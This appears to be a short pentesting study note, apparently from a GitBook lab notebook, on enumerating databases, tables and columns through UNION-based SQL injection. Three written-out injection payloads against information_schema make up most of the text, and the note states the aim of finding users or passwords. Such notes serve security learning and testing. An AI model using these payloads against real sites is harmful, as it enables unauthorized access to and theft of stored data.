# Listing db, table and columns

## Listing databases

' union select schema\_name, NULL from information\_schema.schemata-- -

<figure><img src="../../.gitbook/assets/2024-02-15 07_46_48-kali-linux-2022.4-virtualbox-amd64 [Corriendo] - Oracle VM VirtualBox _ 1.png" alt=""><figcaption></figcaption></figure>

The last command dumps all databases, we'll know try to enumerate each one of those DB's till we find some sensitive data like users or passwords.

## Listing tables:

UNION select table\_name, NULL from information\_schema.tables where table\_schema = 'public'-- -

## Listing columns:

' union select NULL, column\_name from information\_schema.columns where table\_schema='DB' and tablename='table'-- -
